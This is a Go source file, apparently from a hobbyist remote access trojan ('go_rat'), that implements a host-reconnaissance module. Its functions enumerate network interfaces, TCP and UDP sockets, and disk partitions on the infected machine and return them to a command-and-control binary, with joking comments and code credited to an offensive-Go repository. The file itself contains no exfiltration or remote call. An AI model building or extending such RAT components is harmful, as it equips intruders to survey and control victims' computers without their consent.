/*/
This file contains platform independant code for gathering host intelligence
	-uses code from the following sources of open source information
		https://github.com/bluesentinelsec/OffensiveGoLang/

	Please support thier efforts engaging with them (not like that you doofus)
	More community support == More Success for everyone

	BY DEFAULT, THIS FILE ONLY DOES THINGS NOISY AS ALL HELL
	IF YOU WANT NINJA CODE, YOU NEED TO CODE THAT BEHAVIOR IN!
/*/

package Intel

// import the libraries we need
import (
	"go_rat/pkg/shared_code/Core"
	shared_code "go_rat/pkg/shared_code/Core"
	"go_rat/pkg/shared_code/ErrorHandling"
	"net"

	// necessary for getting netowork information
	"github.com/cakturk/go-netstat/netstat"
	// Software information Enumeration

	// Disk information
	"github.com/shirou/gopsutil/disk"
)

/*
Function to gather information about the host
the rat is in residence on, This is the MAIN function
That calls the others depending on the request from the
Command and Control binary
*/
//This is available outside the module because it is capitalized
func GatherIntel(intel_container *shared_code.HostIntel) *shared_code.HostIntel {
	// maybe you could add some logic to control this thing?

	//## Contintued from the NewHostIntel() Function declaration
	//
	// lets you declare things very simply like this
	get_interfaces(intel_container)
	GetTCPConnections(intel_container)
	GetUDPConnections(intel_container)
	GetDrives(intel_container)
	return intel_container
}

// this is not available outside the module because it is NOT capitalized
func get_interfaces(intel_struct *shared_code.HostIntel) bool {
	// error check everything!
	// return true or false depending on error
	// Get all network interfaces
	herp, derp := net.Interfaces()
	if derp != nil {
		ErrorHandling.Error_printer(derp, "generic error, fix me plz lol <3!")
		return false
	}
	intel_struct.Interfaces = herp
	return true
}

// code from:
//https://github.com/bluesentinelsec/OffensiveGoLang/blob/master/pkg/windows/discovery/hardrives.go

// GetDrives iterates through the alphabet to return a list of mounted drives
func GetDrives(intel_struct *Core.HostIntel) bool {
	herp, derp := disk.Partitions(true)
	if derp != nil {
		ErrorHandling.Error_printer(derp, "generic error, fix me plz lol <3!")
		return false
	}
	intel_struct.DriveInformation = herp
	return true
}

// ToDo: add functions for IPv6 connections

// GetTCPConnections returns a slice describing TCP connections
func GetTCPConnections(intel_struct *Core.HostIntel) bool {

	// TCP sockets
	herp, derp := netstat.TCPSocks(netstat.NoopFilter)
	if derp != nil {
		ErrorHandling.Error_printer(derp, "generic error, fix me plz lol <3!")
		return false
	}
	intel_struct.TCPConnections = herp
	return true
}

// GetUDPConnections returns a slice describing UDP connections
func GetUDPConnections(intel_struct *Core.HostIntel) bool {
	// UDP sockets
	herp, derp := netstat.UDPSocks(netstat.NoopFilter)
	if derp != nil {
		ErrorHandling.Error_printer(derp, "generic error, fix me plz lol <3!")
		return false
	}
	intel_struct.UDPConnections = herp
	return true
}
